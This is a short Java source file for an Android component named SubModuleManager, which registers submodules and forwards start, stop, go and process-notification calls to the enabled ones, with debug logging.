package com.android.networking.module;

import java.util.ArrayList;
import java.util.List;

import com.android.networking.ProcessInfo;
import com.android.networking.auto.Cfg;
import com.android.networking.evidence.Markup;
import com.android.networking.util.Check;

public class SubModuleManager {
	private static final String TAG = "SubModuleManager";

	private BaseModule module;
	private List<SubModule> submodules;

	public SubModuleManager(BaseModule module) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (SubModuleManager), module: ");
		}
		this.module = module;
		submodules = new ArrayList<SubModule>();
	}

	public void add(SubModule subModule) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (add), subModule: " + subModule);
		}
		subModule.init(module, new Markup(module, subModule.getClass().getName()));
		if (subModule.enabled) {
			submodules.add(subModule);
		}
	}

	public boolean start() {
		for (SubModule sub : submodules) {
			if (sub.enabled) {
				sub.start();
			}
		}
		return false;
	}

	public boolean stop() {
		for (SubModule sub : submodules) {
			if (sub.enabled) {
				sub.stop();
			}
		}
		return false;
	}

	public boolean go() {
		for (SubModule sub : submodules) {
			if (sub.enabled) {
				sub.go();
			}
		}
		return false;
	}

	public int notification(ProcessInfo process) {
		int num = 0;
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): " + process);
		}
		for (SubModule sub : submodules) {
			if (sub.enabled) {
				num += sub.notification(process);
			}
		}
		return num;
	}
}
